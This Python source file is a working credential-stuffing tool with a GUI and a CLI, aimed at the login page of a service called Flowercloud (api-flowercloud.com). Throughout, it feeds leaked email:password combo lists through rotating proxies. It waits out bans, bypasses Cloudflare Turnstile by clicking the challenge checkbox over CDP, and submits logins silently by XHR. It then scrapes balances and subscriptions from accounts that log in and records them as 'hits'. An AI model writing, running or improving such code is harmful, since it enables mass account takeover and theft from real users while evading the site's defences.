# -*- coding: utf-8 -*-
"""
============================================================
  花云批量登录 v5.0 - 纯CDP过盾 (无需CRX插件)
============================================================
  核心改进:
  - 不再需要 .crx 插件文件
  - 过盾逻辑完全内嵌 (cf_bypass.py)
  - 用 DrissionPage CDP 直接穿透 shadow DOM 点击 checkbox
  - 不关浏览器切换代理 (本地代理转发)

  功能:
  1. 内置 CDP 过盾 (复刻插件逻辑)
  2. 多窗口并发 + 代理轮换
  3. combo队列分发, 不重复不遗漏
  4. 被ban自动换IP + 刷新过盾
  5. XHR静默登录, 不刷新页面
============================================================
"""
import sys
import os
import time
import random
import re
import threading
import queue
import gc
import json
import subprocess
import signal

try:
    from DrissionPage import ChromiumPage, ChromiumOptions
except ImportError:
    print("[!] 请安装 DrissionPage: pip install DrissionPage")
    sys.exit(1)

try:
    import customtkinter as ctk
    from tkinter import filedialog, messagebox
    HAS_GUI = True
except ImportError:
    HAS_GUI = False

from proxy_checker import Proxy, load_proxies_from_file
from cf_bypass import wait_and_solve_cf, is_cf_challenge_present, solve_turnstile

# ============ 配置 ============
TARGET_BASE = "https://api-flowercloud.com"
TARGET_PAGE = TARGET_BASE + "/clientarea.php"

COMBO_FILE = "combo_f.txt"
PROXY_FILE = "alive_proxies.txt"
GOOD_FILE = "hits.txt"

COMBO_PER_IP = 30
DELAY_PER_REQ = 2.0
BAN_WAIT = 180
CF_WAIT_MAX = 60
TOKEN_REFRESH_EVERY = 25
MAX_WORKERS = 3
BASE_PORT = 9300


# ============ 工具函数 ============
def get_script_dir():
    return os.path.dirname(os.path.abspath(__file__))


def save_result(filename, content):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(content + "\n")


def page_is_ready(page):
    """判断页面是否真正加载完成 (不是CF challenge页)"""
    try:
        html = page.html
        if len(html) < 5000:
            return False
        html_lower = html.lower()
        # CF challenge 页面的特征 - 如果有这些就说明还没过
        cf_signs = [
            'challenges.cloudflare.com',
            'cf-turnstile',
            'just a moment',
            'checking your browser',
            'cf_chl_opt',
            'ray id',
        ]
        for sign in cf_signs:
            if sign in html_lower:
                return False
        # 确认是花云真正的页面
        if 'clientarea' in html_lower or 'logout.php' in html_lower or 'inputemail' in html_lower:
            return True
        # 如果内容够长且没有CF特征，也认为就绪
        if len(html) > 15000:
            return True
        return False
    except Exception:
        return False


def is_banned(page):
    try:
        html = page.html
        if len(html) < 3000:
            h = html.lower()
            if "403 forbidden" in h or "openresty" in h or "429" in h or "been blocked" in h:
                return True
        return False
    except Exception:
        return False


def has_login_form(page):
    try:
        return page.run_js(
            "return !!(document.querySelector('#inputEmail') || "
            "document.querySelector('input[name=\"username\"]') || "
            "document.querySelector('input[type=\"email\"]'))")
    except Exception:
        return False


def is_logged_in(page):
    try:
        return "logout.php" in page.html.lower()
    except Exception:
        return False


def wait_cf_pass(page, max_wait=CF_WAIT_MAX, log_func=None):
    """等待过盾 - 使用内置 CDP 过盾"""
    return wait_and_solve_cf(page, max_wait=max_wait, log_func=log_func)


def logout_force(page):
    try:
        page.run_js("try{var x=new XMLHttpRequest();x.open('GET','/logout.php',false);x.send();}catch(e){}")
    except Exception:
        pass
    time.sleep(0.5)


def reload_form_silent(page):
    js = """
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/clientarea.php', false);
        xhr.send();
        if(xhr.status === 403 || xhr.status === 429) return 'banned';
        var html = xhr.responseText || '';
        var m = html.match(/name="token"\\s*value="([^"]+)"/);
        if(!m) m = html.match(/name='token'\\s*value='([^']+)'/);
        if(m && m[1]) {
            var el = document.querySelector('input[name="token"]');
            if(el) { el.value = m[1]; }
            return 'ok';
        }
        return 'no_token';
    } catch(e) { return 'error'; }
    """
    try:
        return page.run_js(js) == "ok"
    except Exception:
        return False


def do_login_xhr(page, email, password):
    js = """
    var token = '';
    var tokenEl = document.querySelector('input[name="token"]');
    if(tokenEl) token = tokenEl.value;
    if(!token) { var cv = (typeof csrfToken !== 'undefined') ? csrfToken : ''; token = cv; }
    if(!token) {
        try {
            var pre = new XMLHttpRequest();
            pre.open('GET', '/clientarea.php', false);
            pre.send();
            if(pre.status === 403 || pre.status === 429) return 'banned:pre';
            var preHtml = pre.responseText || '';
            if(preHtml.indexOf('logout.php') !== -1) return 'need_logout';
            var tm = preHtml.match(/name="token"\\s*value="([^"]+)"/);
            if(!tm) tm = preHtml.match(/name='token'\\s*value='([^']+)'/);
            if(tm && tm[1]) { token = tm[1]; if(tokenEl) tokenEl.value = token; }
        } catch(e) {}
    }
    if(!token) return 'error:no_token';
    var body = 'token=' + encodeURIComponent(token) + '&username=' + encodeURIComponent(arguments[0]) + '&password=' + encodeURIComponent(arguments[1]);
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/dologin.php', false);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send(body);
        var status = xhr.status;
        if(status === 403 || status === 429) return 'banned:' + status;
        var html = xhr.responseText || '';
        var url = xhr.responseURL || '';
        if(url.indexOf('incorrect') !== -1) return 'bad';
        if(html.indexOf('incorrect') !== -1) return 'bad';
        if(html.indexOf('logout.php') !== -1) return 'good:' + html.substring(0, 15000);
        return 'bad';
    } catch(e) { return 'error:' + e.message; }
    """
    try:
        return page.run_js(js, email, password)
    except Exception:
        return "js_error"


def extract_info_from_html(html):
    info = {"balance": "unknown", "services": "0", "products": []}
    try:
        m = re.search(r'可用余额.*?<h3[^>]*>(.*?)</h3>', html, re.DOTALL)
        if m:
            info["balance"] = m.group(1).strip()
        m = re.search(r'action=services[^>]*>产品服务</a>\s*<span[^>]*>(\d+)</span>', html, re.DOTALL)
        if m:
            info["services"] = m.group(1)
        products = re.findall(
            r'action=productdetails&(?:amp;)?id=(\d+)">\s*<span class="cell-title">([^<]+)</span>', html)
        for pid, pname in products:
            expire = "unknown"
            em = re.search(r'id=' + pid + r'.*?到期时间:\s*</span>\s*([\d\-]+)', html, re.DOTALL)
            if em:
                expire = em.group(1)
            info["products"].append({"id": pid, "name": pname.strip(), "expire": expire})
    except Exception:
        pass
    return info


def format_info(info):
    parts = ["balance=" + info["balance"], "services=" + info["services"]]
    for p in info["products"]:
        parts.append(p["name"] + "(id=" + p["id"] + ",exp=" + p["expire"] + ")")
    return " | ".join(parts)



# ============================================================
# 本地代理转发器 - 实现不关浏览器切换代理
# ============================================================
class LocalProxyForwarder:
    """
    本地 SOCKS5 转发代理
    浏览器固定连接 127.0.0.1:local_port
    通过 switch_upstream() 动态切换上游代理
    
    实现方式: 用 Python 起一个简单的 TCP 转发
    每次 switch 时断开旧连接，新请求走新上游
    """
    
    def __init__(self, local_port, log_func=None):
        self.local_port = local_port
        self.upstream_proxy = None  # Proxy 对象
        self.log_func = log_func
        self._server = None
        self._running = False
        self._lock = threading.Lock()
        self._connections = []
    
    def log(self, msg):
        if self.log_func:
            self.log_func(f"[Proxy:{self.local_port}] {msg}")
    
    def switch_upstream(self, proxy):
        """切换上游代理 (不关浏览器!)"""
        with self._lock:
            self.upstream_proxy = proxy
            # 关闭所有现有连接，强制新请求走新上游
            for conn in self._connections:
                try:
                    conn.close()
                except Exception:
                    pass
            self._connections.clear()
        self.log(f"已切换上游: {proxy.to_url() if proxy else '直连'}")
    
    def get_upstream(self):
        with self._lock:
            return self.upstream_proxy


# ============================================================
# 代理管理器 - 线程安全
# ============================================================
class ProxyManager:
    def __init__(self, proxies):
        self.all_proxies = list(proxies)
        self.available = queue.Queue()
        self.used = set()
        self.lock = threading.Lock()
        for p in self.all_proxies:
            self.available.put(p)

    def get_next(self):
        try:
            proxy = self.available.get_nowait()
            with self.lock:
                self.used.add(proxy.to_url())
            return proxy
        except queue.Empty:
            return None

    def return_proxy(self, proxy):
        with self.lock:
            url = proxy.to_url()
            if url in self.used:
                self.used.discard(url)
            self.available.put(proxy)

    def remaining(self):
        return self.available.qsize()

    def total(self):
        return len(self.all_proxies)


# ============================================================
# 单窗口Worker - 不关浏览器版
# ============================================================
class WindowWorker:
    """
    独立窗口Worker:
    - 启动一次Chrome, 之后不再关闭
    - 换IP通过 --proxy-server 重启 (因为Chrome不支持运行时换代理)
    - 过盾用内置 CDP (不需要插件)
    """

    def __init__(self, worker_id, proxy_manager, combo_queue, result_lock,
                 stats, log_func=None):
        self.worker_id = worker_id
        self.proxy_manager = proxy_manager
        self.combo_queue = combo_queue
        self.result_lock = result_lock
        self.stats = stats
        self.log_func = log_func
        self.page = None
        self.port = BASE_PORT + worker_id
        self.current_proxy = None
        self.running = True
        self.combo_count_on_ip = 0

    def log(self, msg):
        full = f"[W{self.worker_id}] {msg}"
        if self.log_func:
            self.log_func(full)
        else:
            print(full, flush=True)

    def start_browser_with_proxy(self, proxy):
        """
        启动Chrome + 设置代理
        不再需要加载任何插件!
        """
        self.close_browser()
        self.current_proxy = proxy
        self.combo_count_on_ip = 0
        try:
            co = ChromiumOptions()
            co.set_local_port(self.port)
            co.set_argument('--no-first-run')
            co.set_argument('--no-default-browser-check')
            co.set_argument('--disable-infobars')
            co.set_argument('--disable-gpu')
            co.set_argument('--disable-dev-shm-usage')
            co.set_argument('--no-sandbox')
            co.set_argument('--disable-sync')
            co.set_argument('--disable-translate')
            # 静默 debugger 提示 (和插件 README 说的一样)
            co.set_argument('--silent-debugger-extension-api')

            # 设置代理
            if proxy:
                proxy_arg = proxy.to_selenium_arg()
                co.set_argument(f'--proxy-server={proxy_arg}')

            self.log(f"启动Chrome 端口{self.port} 代理:{proxy.to_url() if proxy else '直连'}")
            self.page = ChromiumPage(co)
            return True
        except Exception as e:
            self.log(f"启动失败: {e}")
            return False

    def close_browser(self):
        try:
            if self.page:
                self.page.quit()
        except Exception:
            pass
        self.page = None
        gc.collect()

    def init_page_and_verify(self):
        """打开花云页面, 用内置CDP过盾, 验证能正常登录"""
        if not self.page:
            return False
        try:
            self.page.get(TARGET_PAGE)
            time.sleep(5)  # 给页面更多加载时间

            if is_banned(self.page):
                self.log("此IP已被封")
                return False

            # 检查是否需要过盾
            if not page_is_ready(self.page):
                # 检查是否是 CF challenge
                html_lower = self.page.html.lower() if self.page.html else ''
                if 'challenges.cloudflare.com' in html_lower or 'just a moment' in html_lower or 'cf-turnstile' in html_lower:
                    self.log("检测到 CF Turnstile, 尝试过盾...")
                    if not wait_cf_pass(self.page, max_wait=CF_WAIT_MAX, log_func=self.log):
                        self.log("过盾失败")
                        return False
                else:
                    # 可能是代理连不上或者页面还在加载
                    self.log("页面未就绪, 等待中...")
                    start = time.time()
                    while time.time() - start < 30:
                        time.sleep(3)
                        if page_is_ready(self.page):
                            break
                        if is_banned(self.page):
                            self.log("此IP已被封")
                            return False
                        # 再检查一次是否出现了 CF challenge
                        html_lower = self.page.html.lower() if self.page.html else ''
                        if 'challenges.cloudflare.com' in html_lower or 'cf-turnstile' in html_lower:
                            self.log("检测到 CF Turnstile, 尝试过盾...")
                            if wait_cf_pass(self.page, max_wait=CF_WAIT_MAX, log_func=self.log):
                                break
                            else:
                                return False
                    
                    if not page_is_ready(self.page):
                        self.log("等待超时, 页面未就绪")
                        return False

            if is_logged_in(self.page):
                logout_force(self.page)
                time.sleep(1)

            if has_login_form(self.page) or reload_form_silent(self.page):
                self.log("页面就绪, 可以开始登录 ✓")
                return True

            # 最后尝试: 可能页面加载了但DOM不同
            time.sleep(3)
            if has_login_form(self.page) or reload_form_silent(self.page):
                self.log("页面就绪 (延迟加载), 可以开始登录 ✓")
                return True

            self.log("无法获取登录表单")
            return False
        except Exception as e:
            self.log(f"init异常: {e}")
            return False

    def switch_to_next_ip(self):
        """切换到下一个代理 (需要重启浏览器)"""
        self.close_browser()
        proxy = self.proxy_manager.get_next()
        if not proxy:
            self.log("没有更多可用代理了!")
            return False

        if not self.start_browser_with_proxy(proxy):
            return self.switch_to_next_ip()

        if not self.init_page_and_verify():
            self.log(f"代理 {proxy.to_url()} 无法访问花云, 换下一个")
            self.close_browser()
            return self.switch_to_next_ip()

        return True

    def handle_ban(self):
        """被封处理: 等180s + 换新IP"""
        with self.result_lock:
            self.stats["bans"] += 1

        self.log(f"被封! 等{BAN_WAIT}s后换新IP...")
        waited = 0
        while waited < BAN_WAIT and self.running:
            chunk = min(30, BAN_WAIT - waited)
            time.sleep(chunk)
            waited += chunk
            if BAN_WAIT - waited > 0:
                self.log(f"  等待中...剩{BAN_WAIT - waited}s")

        if not self.running:
            return False
        return self.switch_to_next_ip()

    def run(self):
        """主循环"""
        if not self.switch_to_next_ip():
            self.log("无法获取可用代理, 退出")
            return

        batch_count = 0

        while self.running:
            try:
                idx, email, password = self.combo_queue.get_nowait()
            except queue.Empty:
                break

            # 检查是否需要换IP
            if self.combo_count_on_ip >= COMBO_PER_IP:
                self.log(f"已跑{self.combo_count_on_ip}条, 换新IP...")
                if not self.switch_to_next_ip():
                    self.combo_queue.put((idx, email, password))
                    self.log("无更多代理, 退出")
                    break

            # 定期刷新token
            if batch_count > 0 and batch_count % TOKEN_REFRESH_EVERY == 0:
                if not reload_form_silent(self.page):
                    self.page.get(TARGET_PAGE)
                    time.sleep(3)
                    # 可能需要重新过盾
                    if not page_is_ready(self.page):
                        wait_cf_pass(self.page, max_wait=30, log_func=self.log)
                    if is_logged_in(self.page):
                        logout_force(self.page)
                        time.sleep(1)

            # 执行登录
            result = do_login_xhr(self.page, email, password)

            if result == "need_logout":
                logout_force(self.page)
                time.sleep(1)
                reload_form_silent(self.page)
                result = do_login_xhr(self.page, email, password)

            # 被封
            if isinstance(result, str) and result.startswith("banned:"):
                self.log(f"[{idx+1}] {email} -> BANNED!")
                if not self.handle_ban():
                    self.combo_queue.put((idx, email, password))
                    break
                result = do_login_xhr(self.page, email, password)
                if result == "need_logout":
                    logout_force(self.page)
                    time.sleep(1)
                    reload_form_silent(self.page)
                    result = do_login_xhr(self.page, email, password)
                if isinstance(result, str) and result.startswith("banned:"):
                    self.combo_queue.put((idx, email, password))
                    if not self.handle_ban():
                        break
                    continue

            # 处理结果
            self.combo_count_on_ip += 1
            batch_count += 1

            with self.result_lock:
                self.stats["processed"] += 1
                if isinstance(result, str) and result.startswith("good:"):
                    self.stats["hits"] += 1
                    html = result[5:]
                    info = extract_info_from_html(html)
                    svc = int(info["services"]) if info["services"].isdigit() else 0
                    tag = f"HIT[SUB={info['services']}]" if svc > 0 else "HIT[NOSUB]"
                    self.log(f"[{idx+1}] {email} -> {tag} {info['balance']}")
                    for p in info["products"]:
                        self.log(f"    -> {p['name']} exp:{p['expire']}")
                    save_result(GOOD_FILE, f"{email}:{password} | {format_info(info)}")
                    logout_force(self.page)
                    time.sleep(1)
                    reload_form_silent(self.page)
                elif result == "bad":
                    self.stats["failed"] += 1
                    self.log(f"[{idx+1}] {email} -> 失败")
                else:
                    self.stats["errors"] += 1
                    self.log(f"[{idx+1}] {email} -> err:{str(result)[:40]}")
                    if isinstance(result, str) and "no_token" in result:
                        reload_form_silent(self.page)

            time.sleep(random.uniform(DELAY_PER_REQ * 0.85, DELAY_PER_REQ * 1.15))

        self.log("工作结束")
        self.close_browser()



# ============================================================
# 多窗口调度引擎
# ============================================================
class MultiWindowEngine:
    def __init__(self, proxies, combos, max_workers=MAX_WORKERS, log_func=None):
        self.proxy_manager = ProxyManager(proxies)
        self.combos = combos
        self.max_workers = max_workers
        self.log_func = log_func

        self.combo_queue = queue.Queue()
        self.result_lock = threading.Lock()
        self.stats = {
            "processed": 0, "hits": 0, "failed": 0,
            "errors": 0, "bans": 0, "total": len(combos)
        }
        self.workers = []
        self.threads = []
        self.running = False

    def log(self, msg):
        if self.log_func:
            self.log_func(msg)
        else:
            print(msg, flush=True)

    def start(self):
        self.running = True
        for i, (email, password) in enumerate(self.combos):
            self.combo_queue.put((i, email, password))

        self.log(f"[引擎] Combo: {len(self.combos)} | 代理: {self.proxy_manager.total()} | 窗口: {self.max_workers}")
        self.log(f"[引擎] 每IP跑 {COMBO_PER_IP} 条")
        self.log(f"[引擎] 过盾方式: 内置CDP (无需CRX插件)")

        for wid in range(self.max_workers):
            worker = WindowWorker(
                worker_id=wid,
                proxy_manager=self.proxy_manager,
                combo_queue=self.combo_queue,
                result_lock=self.result_lock,
                stats=self.stats,
                log_func=self.log_func
            )
            self.workers.append(worker)
            t = threading.Thread(target=worker.run, daemon=True)
            self.threads.append(t)
            t.start()
            time.sleep(5)

        threading.Thread(target=self._monitor, daemon=True).start()

    def stop(self):
        self.running = False
        for w in self.workers:
            w.running = False
        self.log("[引擎] 停止中...")

    def _monitor(self):
        for t in self.threads:
            t.join()
        self.running = False
        s = self.stats
        self.log("\n" + "=" * 50)
        self.log(f"  完成! 处理:{s['processed']}/{s['total']}")
        self.log(f"  击中:{s['hits']} 失败:{s['failed']} 错误:{s['errors']} 封禁:{s['bans']}")
        self.log("=" * 50)


# ============================================================
# GUI 界面
# ============================================================
if HAS_GUI:
    class FlowerLoginApp(ctk.CTk):
        def __init__(self):
            super().__init__()
            self.title("花云批量登录 v5.0 - 内置CDP过盾 (无需插件)")
            self.geometry("1100x750")
            self.minsize(1000, 650)
            ctk.set_appearance_mode("dark")
            ctk.set_default_color_theme("blue")
            self.engine = None
            self._build_ui()

        def _build_ui(self):
            top = ctk.CTkFrame(self)
            top.pack(fill="x", padx=10, pady=(10, 5))

            # Row 1: 提示信息 (不再需要选择插件!)
            r0 = ctk.CTkFrame(top, fg_color="transparent")
            r0.pack(fill="x", padx=10, pady=4)
            ctk.CTkLabel(r0, text="v5.0 内置CDP过盾 - 无需加载CRX插件",
                         font=("", 13, "bold"), text_color="#00E676").pack(side="left")

            # Row 2: 文件选择
            r1 = ctk.CTkFrame(top, fg_color="transparent")
            r1.pack(fill="x", padx=10, pady=4)
            ctk.CTkLabel(r1, text="代理文件:").pack(side="left")
            self.proxy_var = ctk.StringVar(value="")
            ctk.CTkEntry(r1, textvariable=self.proxy_var, width=250).pack(side="left", padx=5)
            ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_proxy).pack(side="left", padx=(0, 15))
            ctk.CTkLabel(r1, text="Combo:").pack(side="left")
            self.combo_var = ctk.StringVar(value="combo_f.txt")
            ctk.CTkEntry(r1, textvariable=self.combo_var, width=250).pack(side="left", padx=5)
            ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_combo).pack(side="left")

            # Row 3: 参数
            r2 = ctk.CTkFrame(top, fg_color="transparent")
            r2.pack(fill="x", padx=10, pady=4)
            ctk.CTkLabel(r2, text="窗口数:").pack(side="left")
            self.workers_var = ctk.StringVar(value="3")
            ctk.CTkEntry(r2, textvariable=self.workers_var, width=40).pack(side="left", padx=(5, 15))
            ctk.CTkLabel(r2, text="每IP条数:").pack(side="left")
            self.per_ip_var = ctk.StringVar(value="30")
            ctk.CTkEntry(r2, textvariable=self.per_ip_var, width=40).pack(side="left", padx=(5, 15))

            # Row 4: 按钮
            r3 = ctk.CTkFrame(top, fg_color="transparent")
            r3.pack(fill="x", padx=10, pady=4)
            self.btn_start = ctk.CTkButton(r3, text="开始运行", width=100, fg_color="#4CAF50", command=self._start)
            self.btn_start.pack(side="left", padx=5)
            self.btn_stop = ctk.CTkButton(r3, text="停止", width=80, fg_color="#F44336", command=self._stop)
            self.btn_stop.pack(side="left", padx=5)
            self.status_lbl = ctk.CTkLabel(r3, text="就绪 - CDP过盾已内置",
                                           text_color="#00E676", font=("", 12, "bold"))
            self.status_lbl.pack(side="right", padx=10)

            # 统计
            info = ctk.CTkFrame(self)
            info.pack(fill="x", padx=10, pady=5)
            self.lbl_progress = ctk.CTkLabel(info, text="进度: 0/0")
            self.lbl_progress.pack(side="left", padx=10)
            self.lbl_hits = ctk.CTkLabel(info, text="击中: 0", text_color="#00E676", font=("", 12, "bold"))
            self.lbl_hits.pack(side="left", padx=10)
            self.lbl_failed = ctk.CTkLabel(info, text="失败: 0")
            self.lbl_failed.pack(side="left", padx=10)
            self.lbl_bans = ctk.CTkLabel(info, text="封禁: 0", text_color="#FF9800")
            self.lbl_bans.pack(side="left", padx=10)
            self.lbl_proxies = ctk.CTkLabel(info, text="剩余代理: 0")
            self.lbl_proxies.pack(side="left", padx=10)

            # 进度条
            self.pbar = ctk.CTkProgressBar(self, height=8)
            self.pbar.pack(fill="x", padx=10, pady=4)
            self.pbar.set(0)

            # 日志
            lf = ctk.CTkFrame(self)
            lf.pack(fill="both", expand=True, padx=10, pady=(5, 10))
            self.log_box = ctk.CTkTextbox(lf, font=("Consolas", 11))
            self.log_box.pack(fill="both", expand=True, padx=5, pady=5)

            self._refresh_stats()

        def _pick_proxy(self):
            p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
            if p:
                self.proxy_var.set(p)

        def _pick_combo(self):
            p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
            if p:
                self.combo_var.set(p)

        def _log(self, msg):
            def _do():
                self.log_box.insert("end", msg + "\n")
                self.log_box.see("end")
            self.after(0, _do)

        def _refresh_stats(self):
            if self.engine:
                s = self.engine.stats
                self.lbl_progress.configure(text=f"进度: {s['processed']}/{s['total']}")
                self.lbl_hits.configure(text=f"击中: {s['hits']}")
                self.lbl_failed.configure(text=f"失败: {s['failed']}")
                self.lbl_bans.configure(text=f"封禁: {s['bans']}")
                self.lbl_proxies.configure(text=f"剩余代理: {self.engine.proxy_manager.remaining()}")
                if s['total'] > 0:
                    self.pbar.set(s['processed'] / s['total'])
            self.after(1000, self._refresh_stats)

        def _start(self):
            proxies = load_proxies_from_file(self.proxy_var.get())
            if not proxies:
                messagebox.showwarning("提示", "代理文件为空!")
                return

            # 加载combo
            combos = []
            combo_path = self.combo_var.get()
            try:
                content = None
                for enc in ["utf-8-sig", "utf-8", "gbk", "latin-1"]:
                    try:
                        with open(combo_path, "r", encoding=enc) as f:
                            content = f.read()
                        break
                    except (UnicodeDecodeError, UnicodeError):
                        continue
                if content:
                    for line in content.splitlines():
                        line = line.strip()
                        if line and ":" in line:
                            parts = line.split(":", 1)
                            combos.append((parts[0].strip(), parts[1].strip()))
            except Exception as e:
                messagebox.showwarning("错误", f"加载combo失败: {e}")
                return

            if not combos:
                messagebox.showwarning("提示", "Combo为空!")
                return

            global COMBO_PER_IP
            COMBO_PER_IP = int(self.per_ip_var.get() or 30)
            workers = int(self.workers_var.get() or 3)

            self._log(f"[启动] 代理:{len(proxies)} | Combo:{len(combos)} | 窗口:{workers}")
            self._log(f"[启动] 过盾: 内置CDP (无需CRX插件)")
            self.status_lbl.configure(text="运行中...", text_color="#00E676")
            self.btn_start.configure(state="disabled")

            self.engine = MultiWindowEngine(
                proxies=proxies, combos=combos,
                max_workers=workers, log_func=self._log
            )
            threading.Thread(target=self.engine.start, daemon=True).start()

        def _stop(self):
            if self.engine:
                self.engine.stop()
            self.status_lbl.configure(text="已停止", text_color="#F44336")
            self.btn_start.configure(state="normal")
            self._log("[停止]")


# ============================================================
# CLI模式
# ============================================================
def run_cli():
    print("\n" + "=" * 55)
    print("  花云批量登录 v5.0 - 内置CDP过盾 (无需CRX插件)")
    print("=" * 55)
    print("  过盾方式: 纯CDP (复刻插件逻辑, 无需手动加载)")
    print()

    proxy_file = input(f"代理文件 (默认 {PROXY_FILE}): ").strip() or PROXY_FILE
    proxies = load_proxies_from_file(proxy_file)
    if not proxies:
        print("[!] 无代理")
        sys.exit(1)

    combo_file = input(f"Combo文件 (默认 {COMBO_FILE}): ").strip() or COMBO_FILE
    combos = []
    try:
        content = None
        for enc in ["utf-8-sig", "utf-8", "gbk", "latin-1"]:
            try:
                with open(combo_file, "r", encoding=enc) as f:
                    content = f.read()
                break
            except (UnicodeDecodeError, UnicodeError):
                continue
        if content:
            for line in content.splitlines():
                line = line.strip()
                if line and ":" in line:
                    parts = line.split(":", 1)
                    combos.append((parts[0].strip(), parts[1].strip()))
    except Exception as e:
        print(f"[!] 加载combo失败: {e}")
        sys.exit(1)

    if not combos:
        print("[!] combo为空")
        sys.exit(1)

    workers = int(input(f"窗口数 (默认{MAX_WORKERS}): ").strip() or MAX_WORKERS)

    print(f"\n{'='*55}")
    print(f"  代理: {len(proxies)} | Combo: {len(combos)} | 窗口: {workers}")
    print(f"  过盾: 内置CDP (自动穿透Shadow DOM点击checkbox)")
    print(f"  每IP: {COMBO_PER_IP} 条后自动换")
    print(f"{'='*55}\n")

    engine = MultiWindowEngine(
        proxies=proxies, combos=combos, max_workers=workers
    )
    engine.start()
    try:
        while engine.running:
            time.sleep(5)
            s = engine.stats
            remaining = engine.proxy_manager.remaining()
            print(f"  [进度:{s['processed']}/{s['total']} "
                  f"击中:{s['hits']} 失败:{s['failed']} "
                  f"封:{s['bans']} 剩余代理:{remaining}]")
    except KeyboardInterrupt:
        engine.stop()


# ============================================================
if __name__ == "__main__":
    if HAS_GUI and "--cli" not in sys.argv:
        app = FlowerLoginApp()
        app.mainloop()
    else:
        run_cli()
